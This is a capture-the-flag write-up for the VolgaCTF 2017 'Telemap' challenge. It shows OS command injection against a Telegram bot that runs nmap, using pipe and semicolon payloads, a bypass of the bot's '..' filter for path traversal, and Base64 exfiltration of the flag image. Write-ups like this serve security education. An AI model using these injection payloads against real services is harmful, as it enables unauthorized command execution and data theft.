---
layout: page
title: "VolgaCTF 2017 Quals Writeup: Telemap"
---

> Telemap
> 
> 200
> 
> He is hiding something @VolgaCTFScanner_bot

We are not given much information here, so the first order of business is to find out who ```@VolgaCTFScanner_bot``` is. Twitter search does not have an account by that name. But the organizers use [Telegram](https://telegram.org/) for the chat, and a quick search reveals that it is indeed a Telegram account.

After connecting to the bot on Telegram we send it a few random words to initiate the conversation. It's slow to respond, but when it does, it complains about an invalid IP address. 

When we send it an IP address we get an [NMAP](https://nmap.org/) response back!

```
> 80.93.182.205
Starting Nmap 7.01 ( https://nmap.org ) at 2017-03-25 00:21 +04
Nmap scan report for 80.93.182.205
Host is up (0.00025s latency).
PORT     STATE  SERVICE
21/tcp   closed ftp
22/tcp   open   ssh
23/tcp   closed telnet
80/tcp   open   http
443/tcp  open   https
3389/tcp closed ms-wbt-server

Nmap done: 1 IP address (1 host up) scanned in 0.04 seconds
```

I smell OS command injection! :smile: Let's try it:

```
> 80.93.182.205 | find
.
./txt
./txt/2.txt
./some-files
./some-files/some-text.txt
./flag-ololo.txt
./img
./img/1.jpg
./img/5.jpg
./img/4.jpg
./img/3.jpg
./img/2.jpg
./img/0.jpg
./1.txt
./telegram-bot.pl
./hello-dear.txt
```

As we can see there are a number of files in this folder. Examining each one of them with ```cat``` does not bring back a flag, however. And some of the requests fail. ```telegram-bot.pl``` is the source of the bot and after looking at it we see the reason for the failures:

```perl
...

$text =~ s/\.\./\./g; # switch .. to .
# filter - / ~ '
if ( $text =~ /[\-\/~'=]/) {

  $result = 0;$result_text = "Invalid character";
  
...
```

Filtering of ```..``` and ```/``` make path traversal to other places difficult. However, ```..``` replacement can be defeated - we can send ```....``` and have them replaced with ```..```:

```
> 80.93.182.205 | ls ....
bot
F-l-@_G
```

A-ha, there's the flag! When we examine the flag file we see that it's an image, so to exfil let's Base64-encode it:

```
> 80.93.182.205 ; cd .... ; cat F* | base64
Starting Nmap 7.01 ( https://nmap.org ) at 2017-03-25 00:21 +04
Nmap scan report for 80.93.182.205
Host is up (0.00025s latency).
PORT     STATE  SERVICE
21/tcp   closed ftp
22/tcp   open   ssh
23/tcp   closed telnet
80/tcp   open   http
443/tcp  open   https
3389/tcp closed ms-wbt-server

Nmap done: 1 IP address (1 host up) scanned in 0.04 seconds
iVBORw0KGgoAAAANSUhEUgAAAZgAAAAqCAIAAAABLNrIAAAAAXNSR0IArs4c6QAAAARnQU1BAACx
jwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAf9SURBVHhe7ZjreeQ2DEW3LhfkelzNNrPFbCQA
JPG4oChZsxn5w/kVgXhcgBw4ya+/RVEUD6cWWVEUj6cWWVEUj6cWWVEUj6cWWVEUj6cWWVEUj6cW
WVEUj6cWWVEUj6cWWVEUj6cWWVEUj6cWWVEUj6cWWVEUj6c ...
```

The image contains the flag - ```VolgaCTF{jUe33I9@8#dDie#!kdEPz}```.